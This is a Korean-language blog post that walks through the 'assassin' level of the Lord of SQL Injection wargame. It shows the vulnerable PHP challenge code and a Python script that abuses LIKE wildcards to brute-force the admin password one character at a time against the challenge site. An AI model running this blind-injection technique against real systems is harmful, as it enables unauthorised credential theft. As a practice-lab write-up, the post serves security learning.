---
layout: post
title:  "los prob_assassin"
date:   2019-09-19
excerpt: "Lord of Sql Injection"
tag:
- los
- blind_sqli
- wargame
- webhacking
comments: true
---
> query : select id from prob_assassin where pw like ''

~~~ php
<?php 
  include "./config.php"; 
  login_chk(); 
  $db = dbconnect(); 
  if(preg_match('/\'/i', $_GET[pw])) exit("No Hack ~_~"); 
  $query = "select id from prob_assassin where pw like '{$_GET[pw]}'"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
  if($result['id'] == 'admin') solve("assassin"); 
  highlight_file(__FILE__); 
?>
~~~

# Solve
1. like의 특징 이용 -> ex) pw에 admin이라는 값이 있을 때 'pw like ad%' -> true
2. guest's pw랑 admin's pw 앞부분이 같음

~~~ python
import requests

url = "https://los.rubiya.kr/chall/assassin_14a1fd552c61c60f034879e5d4171373.php"
cookies = {"PHPSESSID":"xxxxxxxxxxxxx"}

flag = "90" # -> 하나씩 확인해가면서 늘려줌 ex) 9 -> 90 -> 90D
# 90D2FE10 -> guest's pw
isFind = True
while (isFind == True):
    for i in range(48,127):
        isFind = False
        params = "?pw="+flag+chr(i)+"%"
        response=requests.get(url+params,cookies=cookies)
        if (response.text.find("Hello admin") != -1):
            flag += chr(i)
            isFind = True
            print("[+] Find key :",flag)
            break
print ("[-] Finish")
~~~

## ASSASSIN Clear!
